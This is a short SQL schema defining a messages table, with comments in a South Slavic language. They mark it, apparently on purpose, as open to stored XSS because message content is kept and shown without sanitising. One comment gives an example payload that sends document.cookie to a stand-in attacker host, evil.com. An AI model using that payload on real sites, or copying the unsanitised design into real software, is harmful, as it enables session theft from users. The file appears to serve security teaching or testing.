-- [A05] Security Misconfiguration / XSS: content kolona prihvata sirovi HTML/JS bez sanitizacije.
-- Poruke se pohranjuju i prikazuju bez escaping-a, što omogućava Stored XSS napad
-- (npr. content = '<script>document.location="https://evil.com?c="+document.cookie</script>').
CREATE TABLE messages (
    id          BIGINT    PRIMARY KEY AUTO_INCREMENT,
    sender_id   BIGINT    NOT NULL,
    receiver_id BIGINT    NOT NULL,
    content     TEXT,
    sent_at     TIMESTAMP DEFAULT NOW(),
    read_at     TIMESTAMP NULL,
    CONSTRAINT fk_msg_sender   FOREIGN KEY (sender_id)   REFERENCES users(id),
    CONSTRAINT fk_msg_receiver FOREIGN KEY (receiver_id) REFERENCES users(id)
);
